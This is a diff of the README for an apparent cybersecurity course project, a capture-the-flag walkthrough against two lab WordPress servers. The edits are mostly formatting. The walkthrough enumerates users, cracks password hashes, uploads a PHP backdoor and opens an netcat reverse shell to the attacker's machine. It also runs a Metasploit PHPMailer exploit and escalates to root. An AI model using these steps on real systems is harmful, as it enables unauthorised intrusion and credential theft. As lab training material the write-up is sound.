@@ -59,8 +59,8 @@ This scan identifies the services below as potential points of entry:
  ![wpscan results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/wpscan.png "wpscan results")
 
 Identified following users with wpscan:
-   - Steven
-   - Michael
+   - **Steven**
+   - **Michael**
   
   ![users results](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/users.png "users results")
 
@@ -90,13 +90,13 @@ Identified following users with wpscan:
 
  **Flag2**
 - Exploit Used:
--  Capturing Flag 2: While SSH in as user Michael Flag 2 was also found
-- Flag 2 was found in /var/www
-       - Commands:
-       -  `ssh michael@192.168.1.110` 
-       -  `pw: michael`
-       -  `locate *flag*.txt `
-       -  `cat flag2.txt`
+          - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found
+          - Flag 2 was found in `/var/www`
+- Commands:
+           -  `ssh michael@192.168.1.110` 
+           -  `pw: michael`
+           -  `locate *flag*.txt `
+           -  `cat flag2.txt`
        
 
 ![Flag 2 location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag2.png "Flag 2 location")
@@ -106,7 +106,7 @@ Identified following users with wpscan:
 - **Accessing MySQL database**
 
 My sql password
-For Mysqlpassword located wp-config.php file.
+For Mysqlpassword located ```wp-config.php``` file.
 
 ![wp-config cat](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/Wp-config.png "wp-config")
 
@@ -116,19 +116,19 @@ The MySql password was given in the wp-config.php file.
 
 Accessed the Mysql database using the following command:
  
- `mysql -u root -p wordpress`
+- ```mysql -u root -p wordpress```
  
-  Used password `R@v3nSecurity`
+-  Used password ``R@v3nSecurity``
  
 ![Mysql login ](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mysqllogin.png "Mysql login")
 
 - **Flag3**
-- Exploit Used:
-        - Capturing Flag 3: 
-             - Flag 3 was found in wp_posts table in the wordpress database.
-             - Commands:
-                     - `show tables;`
-                     - `select * from wp_posts;`
+         - Exploit Used:
+               - Capturing Flag 3: 
+                       - Flag 3 was found in wp_posts table in the wordpress database.
+               - Commands:
+                     - ```show tables;```
+                     - ```select * from wp_posts;```
 
 ![tables ](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/tables.png "tables")
 
@@ -137,7 +137,7 @@ Accessed the Mysql database using the following command:
 
 Got hashed passwords of both the users `Michael` and `Steven` from the users table.
 
-- `select * from wp_users;`
+- ```select * from wp_users;```
 
 ![Users](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/userstable.png "Users")
 
@@ -145,11 +145,11 @@ Created a wp_hashes.txt with Steven and Michael's hashes,cracked the password ha
 
 On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
             - Command:
-                - `john wp_hashes.txt`
+                - ```john wp_hashes.txt```
 
 ![john](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/john.png "john")
 
-Secured a user `Steven` shell as the user whose password cracked as `pink84`.
+Secured a user ``Steven`` shell as the user whose password cracked as ``pink84``.
 
 
 
@@ -177,31 +177,32 @@ Once escalated to root
 
 The following vulnerabilities were  identified on target1:
 
-**Target 1**
+**Target 1 Vulnerabilities**
 1. User Enumeration (WordPress site)
 2. Weak User Password
 3. Unsalted User Password Hash (WordPress database)
 4. Misconfiguration of User Privileges/Privilege Escalation
 
-### Target2
+---
+## Target2
 Target 2's IP Address: `192.168.1.115`
 
 Enumerated the web server with nikto.
 
  `nikto -C all -h 192.168.1.115`
  
-This creates a list of URLs the Target HTTP server exposes. This server is running Apache Server.
+This created a list of URLs the Target HTTP server exposes. This server is running Apache Server.
 
 ![nikto location](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nikto.png "nikto")
 
 Performed a more in-depth enumeration with gobuster.
 
 Installed gobuster using apt 
-`apt-get install gobuster`
+ - `apt-get install gobuster`
 
 ![Gobuster install](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobusterinstall.png "gobusterinstall")
 
-`gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u “http://192.168.1.115” `
+ - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u “http://192.168.1.115” `
 
 ![Gobuster](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/gobuster.png "gobusterinstall")
 
@@ -216,7 +217,7 @@ Found a flag in  the /vendor directory.
 
 Used searchsploit to find any known vulnerabilities associated with the programs found in Step
 
-`searchsploit –h`
+ - `searchsploit –h`
 Used the provided script exploit.sh to exploit the vulnerability.
 Edited the line at the top of the exploit.sh script to set the `TARGET`variable. Set it equal to the IP address of Target 2 `192.168.1.115`.
 
@@ -230,7 +231,7 @@ Ran the script. It uploaded a file called backdoor.php to the target server. Thi
 
 Navigate to: `http://192.168.1.115/backdoor.php?cmd=ls`
 
-This allowed you to run bash commands on Target 2.
+This allowed to run bash commands on Target 2.
 
 ![backdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/backdoor.png "backdoor")   
 
@@ -238,34 +239,35 @@ Used the backdoor to open a shell session on the target 2.
 
 On the Kali VM, started a netcat listener using command : 
 
-`nc -lnvp 4444 `
+ - `nc -lnvp 4444 `
 ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/nclistener.png "listener")   
 
 
 In the browser, used the backdoor to run: 
 
-nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.
+ - ``nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.``
     
    ![listenerbackdoor](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listenerbackdoor.png "listener")     
     
- ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   
+   ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   
 
 Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
     
-Command: `find /var/www -type f -iname 'flag*' `
+Command:
+   - `find /var/www -type f -iname 'flag*' `
     
 ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3command.png "flag3")     
 
 Opened the flag in the browser window.
-`http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
+   - `http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
    
-    **Flag3**
+  **Flag3**
     
   ![flag3](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/flag3target2.png "flag3")     
 
-Used Metasploit options for a successful attack against phpmailer.
-Got a meterpreter shell from the vulnerable machine.
-The PHPMailer exploit is fairly straightforward. CVE-2016-10045 describes the details of the vulnerability. 
+- Used Metasploit options for a successful attack against phpmailer.
+- Got a meterpreter shell from the vulnerable machine.
+- The PHPMailer exploit was fairly straightforward. `CVE-2016-10045` describes the details of the vulnerability. 
 
    
    ![msfconsole](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/msfconsole.png "msfconsole")   
@@ -274,20 +276,18 @@ The PHPMailer exploit is fairly straightforward. CVE-2016-10045 describes the de
     
  ![mailer](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/mailer.png "mailer")   
     
-    Used the python script and su root to escalate the privilges to the root user.
-
-     - ` python -c 'import pty;pty.spawn("/bin/bash")' `
-     -  `su root`
-     - `passwd:toor`
+   Used the python script and su root to escalate the privilges to the root user.
+      - ` python -c 'import pty;pty.spawn("/bin/bash")' `
+      -  `su root`
+      - `passwd:toor`
     
    ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/Flag4target2.png "flag4")    
+   
+   Got root access to traget to, via directory traversal accessed the flag 4
+   
+   **Flag4**
     
-    
-    Got root access to traget to, via directory traversal accessed the flag 4
-    
-    **Flag4**
-    
-    cat flag4.txt
+      - `cat flag4.txt`
     
    
    ![flag4](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/catflag4.png)  
